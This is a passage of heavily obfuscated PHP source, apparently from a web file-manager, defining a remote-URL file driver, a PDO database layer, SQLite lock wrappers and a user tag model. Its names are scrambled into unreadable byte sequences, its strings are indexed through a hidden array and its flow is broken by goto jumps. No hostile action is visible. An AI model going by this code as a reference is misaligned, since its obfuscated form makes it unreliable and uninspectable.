strtotime($ÛˆĞœƒÊ[$Ø±Äƒåœ[1513]]) : $™®Ë…Œ¾[$Ø±Äƒåœ[1478]]; return $™®Ë…Œ¾; } protected function _isFolder($ğîİÎËÙ) { $¢ß›ïı™ =& $_SERVER[™»È’øè]; if ($ğîİÎËÙ == $¢ß›ïı™[12] || $ğîİÎËÙ == $¢ß›ïı™[8]) { return !0; } $¯ÜÒ‡µ = $this->_objectMeta($ğîİÎËÙ); return isset($¯ÜÒ‡µ[$¢ß›ïı™[33]]) && $¯ÜÒ‡µ[$¢ß›ïı™[33]] == $¢ß›ïı™[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($„Üì“ú = false) { } public function exist($’¸¯–) { $«„™ÈÚ = $this->info($’¸¯–); return $«„™ÈÚ[$_SERVER[™»È’øè][215]]; } public function isFile($Ø©È‘‡) { $ØÑŠúô = $this->info($Ø©È‘‡); return $ØÑŠúô[$_SERVER[™»È’øè][215]]; } public function isFolder($·ûä¡Ü) { return !1; } public function size($ŞÎ„˜óì) { $—˜¶å‚Ù = $this->info($ŞÎ„˜óì); return $—˜¶å‚Ù[$_SERVER[™»È’øè][76]]; } public function info($ºê´¡ÈÄ) { return $this->infoParse($ºê´¡ÈÄ); } public function infoAuth($åÂ˜Ä÷É) { return $this->infoParse($åÂ˜Ä÷É); } public function infoWithChildren($‹¡©‘±œ) { return $this->infoParse($‹¡©‘±œ); } public function infoFull($“ ¶‰ëÑ) { return $this->infoParse($“ ¶‰ëÑ); } private function infoParse($ÒÎ¶„‰à) { $ŒÙ•÷†£ =& $_SERVER[™»È’øè]; $Üñ‘Éñ = $this->header($ÒÎ¶„‰à); if (!$Üñ‘Éñ || !$Üñ‘Éñ[$ŒÙ•÷†£[775]]) { return !1; } $ÈÍØ§äí = _get($Üñ‘Éñ, $ŒÙ•÷†£[380], 0); $Ì†Ô¼›­ = array($ŒÙ•÷†£[32] => $Üñ‘Éñ[$ŒÙ•÷†£[32]], $ŒÙ•÷†£[84] => $ÒÎ¶„‰à, $ŒÙ•÷†£[33] => $ŒÙ•÷†£[213], $ŒÙ•÷†£[76] => intval($ÈÍØ§äí), $ŒÙ•÷†£[174] => get_path_ext($Üñ‘Éñ[$ŒÙ•÷†£[32]]), $ŒÙ•÷†£[1392] => $ÈÍØ§äí > 0 && $Üñ‘Éñ[$ŒÙ•÷†£[1514]], $ŒÙ•÷†£[1393] => !1); return $Ì†Ô¼›­; } private function header($óöƒãŠà) { $®Ûªá›“ =& $_SERVER[™»È’øè]; if (isset(self::$_cacheHeader[$óöƒãŠà])) { return self::$_cacheHeader[$óöƒãŠà]; } $ø£·˜Ü¾ = isset($GLOBALS[$®Ûªá›“[1515]]) ? $GLOBALS[$®Ûªá›“[1515]] : !1; $GLOBALS[$®Ûªá›“[1515]] = !0; self::$_cacheHeader[$óöƒãŠà] = url_header($óöƒãŠà); $GLOBALS[$®Ûªá›“[1515]] = $ø£·˜Ü¾; return self::$_cacheHeader[$óöƒãŠà]; } public function hashSimple($£¼¨âò, $Ÿ„Œ„†â = false) { $Ë Â°öÃ =& $_SERVER[™»È’øè]; $ç›¿›É = $this->info($£¼¨âò); if (!$ç›¿›É || !$ç›¿›É[$Ë Â°öÃ[215]]) { return !1; } $§”“éƒö = $ç›¿›É[$Ë Â°öÃ[76]]; $ÉàÒ×Ä = 200; $ê¡¤ïœ§ = 50; if ($§”“éƒö <= $ÉàÒ×Ä * $ê¡¤ïœ§) { return md5($this->fileSubstr($£¼¨âò, 0, $§”“éƒö)) . $§”“éƒö; } $”è»İùÅ = intval($§”“éƒö / $ê¡¤ïœ§); $ŸšØ­ = $Ë Â°öÃ[12]; $úÖØÜŒ = timeFloat(); $Âº­ßò‰ = 15; for ($ıÃ¹Ç”È = 0; $ıÃ¹Ç”È < $ê¡¤ïœ§; $ıÃ¹Ç”È++) { if (timeFloat() - $úÖØÜŒ > $Âº­ßò‰) { return !1; } $²ÕäÍæ— = $this->fileSubstr($£¼¨âò, $”è»İùÅ * $ıÃ¹Ç”È, $ÉàÒ×Ä); if (!$²ÕäÍæ—) { return !1; } $ŸšØ­ .= $²ÕäÍæ—; } $ŸšØ­ .= $this->fileSubstr($£¼¨âò, $§”“éƒö - $ÉàÒ×Ä, $ÉàÒ×Ä); return md5($ŸšØ­) . $§”“éƒö; } public function getContent($¹«¶Ïèß) { return $this->fileSubstr($¹«¶Ïèß); } public function fileSubstr($çø»µãª, $Ï˜Ö°‹« = 0, $›êˆ¶õ• = -1) { $Â‚¦ôß¯ =& $_SERVER[™»È’øè]; $œ•Í×¦ = $this->info($çø»µãª); if (!$œ•Í×¦ || !$œ•Í×¦[$Â‚¦ôß¯[215]] && $œ•Í×¦[$Â‚¦ôß¯[76]] > 1024 * 1024 * 10) { return !1; } if ($›êˆ¶õ• === -1) { $›êˆ¶õ• = $œ•Í×¦[$Â‚¦ôß¯[76]]; } if ($›êˆ¶õ• == 0) { return $Â‚¦ôß¯[12]; } $ñË÷µªë = array($Â‚¦ôß¯[1516] . $Ï˜Ö°‹« . $Â‚¦ôß¯[807] . ($Ï˜Ö°‹« + $›êˆ¶õ• - 1)); $Ì³ŞÌ = url_request($çø»µãª, $Â‚¦ôß¯[244], !1, $ñË÷µªë, !1, !1, 30); return $Ì³ŞÌ[$Â‚¦ôß¯[1232]] ? $Ì³ŞÌ[$Â‚¦ôß¯[1232]] : $Â‚¦ôß¯[12]; } public function download($›ûÎªÏİ, $æş›Ş ¬) { Downloader::start($›ûÎªÏİ, $æş›Ş ¬); return $æş›Ş ¬; } } goto A¹åÅ†ó¥È; d‚ŠñÀÃ…í: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($««åÂƒ‡ = '') { $±Ø×—Ô =& $_SERVER[™»È’øè]; if (!class_exists($±Ø×—Ô[944])) { think_exception(think_lang($±Ø×—Ô[14]) . $±Ø×—Ô[945]); } if (!empty($««åÂƒ‡)) { $this->config = $««åÂƒ‡; if (empty($this->config[$±Ø×—Ô[17]])) { $this->config[$±Ø×—Ô[17]] = array(); } } } public function connect($Úª Ü‘ô = '', $§÷—•¾ı = 0) { $¾˜ïÌÎü =& $_SERVER[™»È’øè]; if (!isset($this->linkID[$§÷—•¾ı])) { if (empty($Úª Ü‘ô)) { $Úª Ü‘ô = $this->config; } $œÅ¡ÇÈ˜ = !empty($Úª Ü‘ô[$¾˜ïÌÎü[17]][$¾˜ïÌÎü[18]]) ? $Úª Ü‘ô[$¾˜ïÌÎü[17]][$¾˜ïÌÎü[18]] : $this->pconnect; if ($œÅ¡ÇÈ˜) { $Úª Ü‘ô[$¾˜ïÌÎü[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$§÷—•¾ı] = new PDO($Úª Ü‘ô[$¾˜ïÌÎü[946]], $Úª Ü‘ô[$¾˜ïÌÎü[918]], $Úª Ü‘ô[$¾˜ïÌÎü[919]], $Úª Ü‘ô[$¾˜ïÌÎü[17]]); } catch (PDOException $ÔïéÀÕÕ) { think_exception($ÔïéÀÕÕ->getMessage()); } $this->dbType = $this->_getDsnType($Úª Ü‘ô[$¾˜ïÌÎü[946]]); if (in_array($this->dbType, array($¾˜ïÌÎü[947], $¾˜ïÌÎü[948], $¾˜ïÌÎü[949], $¾˜ïÌÎü[950]))) { think_exception($¾˜ïÌÎü[951] . $this->dbType . $¾˜ïÌÎü[952] . $this->dbType . $¾˜ïÌÎü[953]); } if (!$this->linkID[$§÷—•¾ı]) { think_exception($¾˜ïÌÎü[954]); } try { $this->linkID[$§÷—•¾ı]->exec($¾˜ïÌÎü[955] . think_config($¾˜ïÌÎü[921])); } catch (Exception $ÔïéÀÕÕ) { } $this->connected = !0; if (1 != think_config($¾˜ïÌÎü[22])) { unset($this->config); } } return $this->linkID[$§÷—•¾ı]; } public function free() { $this->PDOStatement = null; } public function query($ƒ¢ÚÑŸ‡, $ò¸§Êû = array()) { $Ü¾Îæ‘ =& $_SERVER[™»È’øè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ¢ÚÑŸ‡; if (!empty($ò¸§Êû)) { $this->queryStr .= $Ü¾Îæ‘[956] . print_r($ò¸§Êû, !0) . $Ü¾Îæ‘[957]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ü¾Îæ‘[23], 1); think_status($Ü¾Îæ‘[24]); $this->PDOStatement = $this->_linkID->prepare($ƒ¢ÚÑŸ‡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $êòıœìê = $this->PDOStatement->execute($ò¸§Êû); $this->debug(); if (!1 === $êòıœìê) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¤•ôƒ¦, $Ğ—ƒÚû = array()) { $Š³Ôë±ß =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¤•ôƒ¦; if (!empty($Ğ—ƒÚû)) { $this->queryStr .= $Š³Ôë±ß[956] . print_r($Ğ—ƒÚû, !0) . $Š³Ôë±ß[957]; } $×œ¢¤ãÙ = !1; if ($this->dbType == $Š³Ôë±ß[950]) { if (preg_match($Š³Ôë±ß[958], $this->queryStr, $ò·Ü‰Ğì)) { $this->table = think_config($Š³Ôë±ß[959]) . str_ireplace(think_config($Š³Ôë±ß[960]), $Š³Ôë±ß[421], $ò·Ü‰Ğì[2]); $×œ¢¤ãÙ = (bool) $this->query($Š³Ôë±ß[961] . strtoupper($this->table) . $Š³Ôë±ß[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Š³Ôë±ß[25], 1); think_status($Š³Ôë±ß[24]); $this->PDOStatement = $this->_linkID->prepare($¤•ôƒ¦); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Éõııüü = $this->PDOStatement->execute($Ğ—ƒÚû); $this->debug(); if (!1 === $Éõııüü) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($×œ¢¤ãÙ || preg_match($Š³Ôë±ß[962], $¤•ôƒ¦)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Á€®ËÀ× = $this->_linkID->commit(); $this->transTimes = 0; if (!$Á€®ËÀ×) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Œª£ªÎ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Œª£ªÎ) { $this->error(); return !1; } } return !0; } private function getAll() { $”¾Šˆ† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($”¾Šˆ†); return $”¾Šˆ†; } public function getFields($ ¦Øˆ³¼) { $°Õş¹Ç =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (think_config($°Õş¹Ç[963])) { $‚§Û‚Ë = str_replace($°Õş¹Ç[964], $ ¦Øˆ³¼, think_config($°Õş¹Ç[963])); } else { switch ($this->dbType) { case $°Õş¹Ç[947]: case $°Õş¹Ç[965]: $‚§Û‚Ë = "\123\x45\x4c\105\103\124\40\x20\x20\143\x6f\154\165\155\156\x5f\x6e\141\155\145\x20\141\163\40\47\x4e\x61\155\x65\47\54\x20\x20\40\144\141\164\141\137\164\x79\160\x65\40\141\163\40\x27\x54\x79\160\145\47\54\x20\40\x20\x63\157\154\x75\x6d\x6e\x5f\x64\145\x66\141\165\x6c\x74\40\x61\163\40\x27\x44\145\x66\141\x75\154\x74\x27\x2c\x20\40\x20\x69\163\137\156\x75\x6c\x6c\141\x62\154\x65\x20\141\163\40\47\116\x75\x6c\154\x27\xa\x9\x9\x46\x52\x4f\x4d\x9\151\x6e\146\x6f\x72\x6d\141\164\x69\x6f\x6e\137\x73\143\150\145\155\x61\x2e\164\141\142\x6c\x65\x73\x20\101\x53\x20\x74\xa\11\x9\x4a\x4f\x49\116\x9\x69\x6e\x66\157\x72\x6d\141\164\151\x6f\156\x5f\163\x63\x68\x65\x6d\x61\x2e\143\157\154\x75\155\156\x73\x20\x41\x53\40\x63\12\11\11\x4f\116\40\x20\164\56\x74\x61\x62\x6c\145\137\143\141\x74\141\x6c\x6f\147\40\x3d\x20\143\x2e\x74\x61\x62\154\145\137\x63\x61\164\x61\x6c\157\147\12\x9\11\x41\116\x44\x20\164\x2e\164\141\142\x6c\x65\137\163\143\x68\145\x6d\141\40\x3d\x20\143\x2e\x74\141\x62\154\x65\137\x73\x63\150\145\155\141\12\11\x9\101\116\104\40\x74\56\x74\x61\142\x6c\145\137\x6e\141\x6d\x65\x20\x3d\x20\x63\56\x74\x61\x62\x6c\x65\x5f\156\141\x6d\145\xa\x9\x9\127\x48\x45\x52\105\40\40\40\x74\56\164\141\142\x6c\x65\x5f\156\141\155\145\40\x3d\40\x27{$ ¦Øˆ³¼}\47"; break; case $°Õş¹Ç[966]: $‚§Û‚Ë = $°Õş¹Ç[967] . $ ¦Øˆ³¼ . $°Õş¹Ç[968]; break; case $°Õş¹Ç[948]: case $°Õş¹Ç[950]: $‚§Û‚Ë = $°Õş¹Ç[969] . $°Õş¹Ç[970] . $°Õş¹Ç[971] . strtoupper($ ¦Øˆ³¼) . $°Õş¹Ç[972] . strtoupper($ ¦Øˆ³¼) . $°Õş¹Ç[973]; break; case $°Õş¹Ç[974]: $‚§Û‚Ë = $°Õş¹Ç[975] . $ ¦Øˆ³¼ . $°Õş¹Ç[976]; break; case $°Õş¹Ç[949]: break; case $°Õş¹Ç[977]: default: $‚§Û‚Ë = $°Õş¹Ç[978] . ($this->dbType == $°Õş¹Ç[977] ? "\140{$ ¦Øˆ³¼}\x60" : $ ¦Øˆ³¼); } } $ãÕÀà½á = $this->query($‚§Û‚Ë); $”³†ö”Å = array(); if ($ãÕÀà½á) { foreach ($ãÕÀà½á as $Öˆ”ûìš => $©Á· ¿›) { $©Á· ¿› = array_change_key_case($©Á· ¿›); $©Á· ¿›[$°Õş¹Ç[32]] = isset($©Á· ¿›[$°Õş¹Ç[32]]) ? $©Á· ¿›[$°Õş¹Ç[32]] : $°Õş¹Ç[421]; $©Á· ¿›[$°Õş¹Ç[33]] = isset($©Á· ¿›[$°Õş¹Ç[33]]) ? $©Á· ¿›[$°Õş¹Ç[33]] : $°Õş¹Ç[421]; $Á”úçä = isset($©Á· ¿›[$°Õş¹Ç[316]]) ? $©Á· ¿›[$°Õş¹Ç[316]] : $©Á· ¿›[$°Õş¹Ç[32]]; $”³†ö”Å[$Á”úçä] = array($°Õş¹Ç[32] => $Á”úçä, $°Õş¹Ç[33] => $©Á· ¿›[$°Õş¹Ç[33]], $°Õş¹Ç[35] => (bool) (isset($©Á· ¿›[$°Õş¹Ç[103]]) && $©Á· ¿›[$°Õş¹Ç[103]] === $°Õş¹Ç[12] || isset($©Á· ¿›[$°Õş¹Ç[35]]) && $©Á· ¿›[$°Õş¹Ç[35]] === $°Õş¹Ç[12]), $°Õş¹Ç[37] => isset($©Á· ¿›[$°Õş¹Ç[37]]) ? $©Á· ¿›[$°Õş¹Ç[37]] : (isset($©Á· ¿›[$°Õş¹Ç[56]]) ? $©Á· ¿›[$°Õş¹Ç[56]] : $°Õş¹Ç[421]), $°Õş¹Ç[39] => isset($©Á· ¿›[$°Õş¹Ç[94]]) ? strtolower($©Á· ¿›[$°Õş¹Ç[94]]) == $°Õş¹Ç[41] : (isset($©Á· ¿›[$°Õş¹Ç[57]]) ? $©Á· ¿›[$°Õş¹Ç[57]] : !1), $°Õş¹Ç[42] => isset($©Á· ¿›[$°Õş¹Ç[979]]) ? strtolower($©Á· ¿›[$°Õş¹Ç[979]]) == $°Õş¹Ç[44] : (isset($©Á· ¿›[$°Õş¹Ç[94]]) ? $©Á· ¿›[$°Õş¹Ç[94]] : !1)); } } return $”³†ö”Å; } public function getTables($É¼Å–Ò = '') { $¦Úåñ§ =& $_SERVER[™»È’øè]; if (think_config($¦Úåñ§[980])) { $¶¶Îƒíœ = str_replace($¦Úåñ§[981], $É¼Å–Ò, think_config($¦Úåñ§[980])); } else { switch ($this->dbType) { case $¦Úåñ§[948]: case $¦Úåñ§[950]: $¶¶Îƒíœ = $¦Úåñ§[982]; break; case $¦Úåñ§[947]: case $¦Úåñ§[965]: $¶¶Îƒíœ = $¦Úåñ§[983]; break; case $¦Úåñ§[974]: $¶¶Îƒíœ = $¦Úåñ§[984]; break; case $¦Úåñ§[949]: think_exception(think_lang($¦Úåñ§[985]) . $¦Úåñ§[986]); break; case $¦Úåñ§[966]: $¶¶Îƒíœ = $¦Úåñ§[45] . $¦Úåñ§[46] . $¦Úåñ§[47]; break; case $¦Úåñ§[977]: default: if (!empty($É¼Å–Ò)) { $¶¶Îƒíœ = $¦Úåñ§[929] . $É¼Å–Ò . $¦Úåñ§[930]; } else { $¶¶Îƒíœ = $¦Úåñ§[931]; } } } $ÇŠ´€Ü› = $this->query($¶¶Îƒíœ); $¢æ»èçÕ = array(); foreach ($ÇŠ´€Ü› as $Í™ÌÍµ => $ñÛˆ‚££) { $¢æ»èçÕ[$Í™ÌÍµ] = current($ñÛˆ‚££); } return $¢æ»èçÕ; } protected function parseLimit($©‰¤İ¸É) { $¦ªÙÌ¹“ =& $_SERVER[™»È’øè]; $›¨Ìîì… = $¦ªÙÌ¹“[12]; if (!empty($©‰¤İ¸É)) { switch ($this->dbType) { case $¦ªÙÌ¹“[974]: case $¦ªÙÌ¹“[966]: $©‰¤İ¸É = explode($¦ªÙÌ¹“[50], $©‰¤İ¸É); if (count($©‰¤İ¸É) > 1) { $›¨Ìîì… .= $¦ªÙÌ¹“[51] . $©‰¤İ¸É[1] . $¦ªÙÌ¹“[52] . $©‰¤İ¸É[0] . $¦ªÙÌ¹“[53]; } else { $›¨Ìîì… .= $¦ªÙÌ¹“[51] . $©‰¤İ¸É[0] . $¦ªÙÌ¹“[53]; } break; case $¦ªÙÌ¹“[947]: case $¦ªÙÌ¹“[965]: break; case $¦ªÙÌ¹“[949]: break; case $¦ªÙÌ¹“[948]: case $¦ªÙÌ¹“[950]: break; case $¦ªÙÌ¹“[977]: default: $›¨Ìîì… .= $¦ªÙÌ¹“[51] . $©‰¤İ¸É . $¦ªÙÌ¹“[53]; } } return $›¨Ìîì…; } public function parseKey(&$£‡œñ°İ, $’âıºÜ = true) { $ìÍ¨­Ô =& $_SERVER[™»È’øè]; if ($’âıºÜ) { $£‡œñ°İ = $this->parseKeyCheck($£‡œñ°İ); } if ($this->dbType == $ìÍ¨­Ô[977]) { if ($£‡œñ°İ != $ìÍ¨­Ô[202] && !preg_match($ìÍ¨­Ô[941], $£‡œñ°İ)) { $£‡œñ°İ = $ìÍ¨­Ô[428] . trim($£‡œñ°İ, $ìÍ¨­Ô[428]) . $ìÍ¨­Ô[428]; } return $£‡œñ°İ; } else { return parent::parseKey($£‡œñ°İ, $’âıºÜ); } } public function close() { $this->_linkID = null; } public function error() { $£Ñçú² =& $_SERVER[™»È’øè]; if ($this->PDOStatement) { $‘œöûí = $this->PDOStatement->errorInfo(); $this->error = $‘œöûí[1] . $£Ñçú²[4] . $‘œöûí[2]; } else { $this->error = $£Ñçú²[12]; } if ($£Ñçú²[12] != $this->queryStr) { $this->error .= LNG($£Ñçú²[48]) . $this->queryStr; } think_trace($this->error, $£Ñçú²[12], $£Ñçú²[49]); return $this->error; } public function escapeString($ÀÉ¦‡Úİ) { $ÀÌ¥µè =& $_SERVER[™»È’øè]; switch ($this->dbType) { case $ÀÌ¥µè[974]: case $ÀÌ¥µè[947]: case $ÀÌ¥µè[965]: case $ÀÌ¥µè[977]: return addslashes($ÀÉ¦‡Úİ); case $ÀÌ¥µè[949]: case $ÀÌ¥µè[966]: case $ÀÌ¥µè[948]: case $ÀÌ¥µè[950]: return str_ireplace($ÀÌ¥µè[58], $ÀÌ¥µè[59], $ÀÉ¦‡Úİ); } } protected function parseValue($’ÊöÓŞ¾) { $æØ€şµ½ =& $_SERVER[™»È’øè]; if (is_string($’ÊöÓŞ¾)) { $øèÆ“ = strpos($’ÊöÓŞ¾, $æØ€şµ½[4]) === 0 && in_array($’ÊöÓŞ¾, array_keys($this->bind)); $’ÊöÓŞ¾ = $øèÆ“ ? $this->escapeString($’ÊöÓŞ¾) : $æØ€şµ½[987] . $this->escapeString($’ÊöÓŞ¾) . $æØ€şµ½[987]; } elseif (isset($’ÊöÓŞ¾[0]) && is_string($’ÊöÓŞ¾[0]) && strtolower($’ÊöÓŞ¾[0]) == $æØ€şµ½[340]) { $’ÊöÓŞ¾ = $this->escapeString($’ÊöÓŞ¾[1]); } elseif (is_array($’ÊöÓŞ¾)) { $’ÊöÓŞ¾ = array_map(array($this, $æØ€şµ½[988]), $’ÊöÓŞ¾); } elseif (is_bool($’ÊöÓŞ¾)) { $’ÊöÓŞ¾ = $’ÊöÓŞ¾ ? $æØ€şµ½[88] : $æØ€şµ½[211]; } elseif (is_null($’ÊöÓŞ¾)) { $’ÊöÓŞ¾ = $æØ€şµ½[103]; } return $’ÊöÓŞ¾; } public function getLastInsertId() { $¸×ÚÏ  =& $_SERVER[™»È’øè]; switch ($this->dbType) { case $¸×ÚÏ [974]: case $¸×ÚÏ [966]: case $¸×ÚÏ [947]: case $¸×ÚÏ [965]: case $¸×ÚÏ [949]: case $¸×ÚÏ [977]: return $this->_linkID->lastInsertId(); case $¸×ÚÏ [948]: case $¸×ÚÏ [950]: $†«ñÁÉÌ = $this->table; $®¸¦òºÏ = $this->query("\x53\x45\114\x45\x43\124\40{$†«ñÁÉÌ}\56\x63\x75\162\x72\x76\141\x6c\x20\x63\x75\162\162\166\x61\154\x20\x46\122\x4f\x4d\x20\x64\x75\141\x6c"); return $®¸¦òºÏ ? $®¸¦òºÏ[0][$¸×ÚÏ [989]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($öºäƒº) { $èÂ˜¼Í„ =& $_SERVER[™»È’øè]; if (!CacheLock::fileLock($èÂ˜¼Í„[13])) { return !1; } $„¯Ÿ„¥Ğ = parent::query($öºäƒº); CacheLock::fileUnLock($èÂ˜¼Í„[13]); return $„¯Ÿ„¥Ğ; } public function execute($ĞÇ«Ş®Ê) { $±šÑºŸã =& $_SERVER[™»È’øè]; if (!CacheLock::fileLock($±šÑºŸã[13])) { return !1; } $íÔìü¨÷ = parent::execute($ĞÇ«Ş®Ê); CacheLock::fileUnLock($±šÑºŸã[13]); return $íÔìü¨÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($¡·öÌüª) { $û›šÁÍÊ =& $_SERVER[™»È’øè]; if (!CacheLock::fileLock($û›šÁÍÊ[13])) { return !1; } $É˜¹è­ú = parent::query($¡·öÌüª); CacheLock::fileUnLock($û›šÁÍÊ[13]); return $É˜¹è­ú; } public function execute($Ô•²œ¬ğ) { $®ôÕ‡ =& $_SERVER[™»È’øè]; if (!CacheLock::fileLock($®ôÕ‡[13])) { return !1; } $Î¿½ÇÃ = parent::execute($Ô•²œ¬ğ); CacheLock::fileUnLock($®ôÕ‡[13]); return $Î¿½ÇÃ; } } goto EøÛƒÂÅïƒ; dßâ¦Õ´: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($ÙÚ¼Ê) { $«àĞğã­ =& $_SERVER[™»È’øè]; return array($«àĞğã­[1981] => array($«àĞğã­[2370] . USER_ID, $«àĞğã­[1982])); } protected function listData() { $óÚ»€‘Ğ =& $_SERVER[™»È’øè]; $±ç„öß = array($óÚ»€‘Ğ[1669] => USER_ID, $óÚ»€‘Ğ[524] => array($óÚ»€‘Ğ[1985], 0)); $¤Şáíè = $óÚ»€‘Ğ[2371]; $öœÅÄÖô = $this->field($¤Şáíè)->where($±ç„öß)->order($óÚ»€‘Ğ[1988])->select(); return $öœÅÄÖô ? $öœÅÄÖô : array(); } protected function addToTag($×®îŞşÇ, $ˆÙ£„›î) { $ë¶Áò³´ =& $_SERVER[™»È’øè]; if (!Model($ë¶Áò³´[2130])->listData($ˆÙ£„›î)) { return !1; } if (is_numeric($×®îŞşÇ)) { $ì£â’’ = Model($ë¶Áò³´[850])->pathInfo($×®îŞşÇ); if (!$ì£â’’) { return !1; } } else { $ì£â’’ = IO::infoSimple($×®îŞşÇ); if (!$ì£â’’) { return !1; } $´û¸âˆÊ = $ì£â’’[$ë¶Áò³´[32]]; $¿Çáë×ğ = $ì£â’’[$ë¶Áò³´[33]]; if (isset($ì£â’’[$ë¶Áò³´[452]])) { $¿Çáë×ğ = $ì£â’’[$ë¶Áò³´[452]] == $ë¶Áò³´[88] ? $ë¶Áò³´[75] : $ë¶Áò³´[213]; } } $æíŒŒÀø = array($ë¶Áò³´[1669] => USER_ID, $ë¶Áò³´[524] => $ˆÙ£„›î, $ë¶Áò³´[462] => $×®îŞşÇ, $ë¶Áò³´[463] => $¿Çáë×ğ ? $¿Çáë×ğ : $ë¶Áò³´[457], $ë¶Áò³´[461] => $´û¸âˆÊ ? $´û¸âˆÊ : $ë¶Áò³´[12], $ë¶Áò³´[1874] => 0); if ($this->where($æíŒŒÀø)->find()) { return !1; } return $this->add($æíŒŒÀø); } protected function removeFromTag($‘³Æ›ƒÌ, $Ÿ…ß§) { $åÌÖáÜş =& $_SERVER[™»È’øè]; if (!Model($åÌÖáÜş[2130])->listData($Ÿ…ß§)) { return !1; } if (is_array($‘³Æ›ƒÌ)) { $‘³Æ›ƒÌ = array($åÌÖáÜş[7], $‘³Æ›ƒÌ); } $œØÊ•ñĞ = array($åÌÖáÜş[1669] => USER_ID, $åÌÖáÜş[524] => $Ÿ…ß§, $åÌÖáÜş[462] => $‘³Æ›ƒÌ); return $this->where($œØÊ•ñĞ)->delete(); } protected function removeByTag($Œäßµª) { $™Ø²¯‡´ =& $_SERVER[™»È’øè]; if (!$Œäßµª) { return !1; } $‚ÄÅšĞÇ = array($™Ø²¯‡´[1669] => USER_ID, $™Ø²¯‡´[524] => $Œäßµª); return $this->where($‚ÄÅšĞÇ)->delete(); } protected function removeBySource($§¿ˆç—) { $µ¼‹ñºå =& $_SERVER[™»È’øè]; if (is_array($§¿ˆç—)) { $§¿ˆç— = array($µ¼‹ñºå[7], $§¿ˆç—); } $»Àƒ³ó = array($µ¼‹ñºå[1669] => USER_ID, $µ¼‹ñºå[524] => array($µ¼‹ñºå[1044], 0), $µ¼‹ñºå[462] => $§¿ˆç—); return $this->where($»Àƒ³ó)->delete(); } }